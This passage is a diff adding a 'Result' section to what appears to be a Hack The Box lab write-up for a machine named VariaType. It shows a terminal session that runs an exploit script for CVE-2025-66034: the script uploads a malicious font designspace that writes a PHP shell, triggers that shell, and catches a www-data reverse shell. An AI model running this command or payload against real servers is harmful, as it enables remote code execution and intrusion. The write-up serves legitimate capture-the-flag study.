@@ -1358,7 +1358,27 @@ if __name__ == "__main__":
 - **`--path`**: Defines the destination on the server's filesystem for the PHP shell.
 - **`--trigger`**: The URL the script will request to execute the newly written file.
 
+**Result:**
 
+```shell
+                                                                                                                             
+┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
+└─$ python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path /var/www/portal.variatype.htb/public/files --trigger http://portal.variatype.htb/files --url http://variatype.htb/tools/variable-font-generator/process
+[INFO] [+] Generating compatible master fonts...
+[INFO] [+] Generating shell name...
+[INFO] [+] Using IP address: 10.10.14.71 and Port Number: 4444
+[INFO] [+] Using shell name shell_k228w7aw.php
+[INFO] [+] Creating malicious designspace...
+[INFO] [+] Uploading payload...
+[INFO] [+] Server status: 200
+[INFO] [+] Starting listener on port 4444...
+[INFO] [+] Triggering shell via http://portal.variatype.htb/files/shell_k228w7aw.php
+[INFO] [+] Trigger request status: 200
+bash: cannot set terminal process group (3343): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@variatype:~/portal.variatype.htb/public/files$ 
+
+```
 <div align="center">
 <br>
 <br>
